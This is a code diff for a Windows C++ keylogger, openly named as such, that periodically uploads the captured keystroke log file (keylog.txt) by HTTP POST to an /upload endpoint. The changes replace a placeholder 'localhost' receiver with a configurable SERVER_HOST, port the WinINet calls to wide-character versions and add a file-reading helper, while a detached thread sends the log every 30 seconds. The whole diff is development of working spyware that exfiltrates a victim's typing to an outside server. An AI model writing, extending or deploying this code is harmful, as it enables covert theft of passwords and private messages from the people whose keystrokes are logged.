@@ -1,5 +1,12 @@
 #include "hook.h"
 #include <cstdio>
+#include <string>
+#include <wininet.h>
+#include <thread>
+#include <chrono>
+#include "config.h"
+
+#pragma comment(lib, "wininet.lib")
 
 void clearFile(const char *filename)
 {
@@ -37,27 +44,27 @@ void sendToApi(const std::string &filename)
     std::string body;
     body += "--" + boundary + "\r\n";
     body += "Content-Disposition: form-data; name=\"file\"; filename=\"keylog.txt\"\r\n";
-    body += "Content-Type: text/plain\r\n\r\n";
     body += fileData;
     body += "\r\n--" + boundary + "--\r\n";
 
-    std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
+    std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
+    std::wstring wContentType(contentType.begin(), contentType.end());
 
-    HINTERNET hInternet = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    HINTERNET hInternet = InternetOpen(L"Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet)
         return;
 
-    // TODO: Replace "localhost" with your server receiver endpoint
-    HINTERNET hConnect = InternetConnect(hInternet, "localhost", INTERNET_DEFAULT_HTTP_PORT,
-                                         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    std::wstring wServerHost(SERVER_HOST, SERVER_HOST + strlen(SERVER_HOST));
+    HINTERNET hConnect = InternetConnectW(hInternet, wServerHost.c_str(), INTERNET_DEFAULT_HTTP_PORT,
+                                          NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect)
     {
         InternetCloseHandle(hInternet);
         return;
     }
 
-    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/upload", NULL,
-                                         NULL, NULL, 0, 0);
+    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", L"/upload", NULL,
+                                          NULL, NULL, 0, 0);
     if (!hRequest)
     {
         InternetCloseHandle(hConnect);
@@ -65,12 +72,38 @@ void sendToApi(const std::string &filename)
         return;
     }
 
-    BOOL sent = HttpSendRequest(hRequest, contentType.c_str(), -1L,
-                                (LPVOID)body.c_str(), body.length());
+    BOOL sent = HttpSendRequestW(hRequest, wContentType.c_str(), -1L,
+                                 (LPVOID)body.c_str(), body.length());
 
     InternetCloseHandle(hRequest);
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
+}
+
+std::string readFile(const char *filename)
+{
+    FILE *file = fopen(filename, "rb");
+    if (!file)
+        return "";
+
+    fseek(file, 0, SEEK_END);
+    long fileSize = ftell(file);
+    rewind(file);
+
+    if (fileSize <= 0)
+    {
+        fclose(file);
+        return "";
+    }
+
+    std::string fileData(fileSize, '\0');
+    size_t readSz = fread(&fileData[0], 1, fileSize, file);
+    fclose(file);
+    if (readSz != static_cast<size_t>(fileSize))
+    {
+        return "";
+    }
+    return fileData;
 }
 
 void startSendTimer(const char *filename, int intervalSeconds)
@@ -95,7 +128,8 @@ int main()
         return 1;
     }
 
-    std::thread senderThread(startSendTimer, LOG_FILE_PATH, 30);
+    std::thread senderThread([=]()
+                             { startSendTimer(LOG_FILE_PATH, 30); });
     senderThread.detach();
 
     MSG msg;
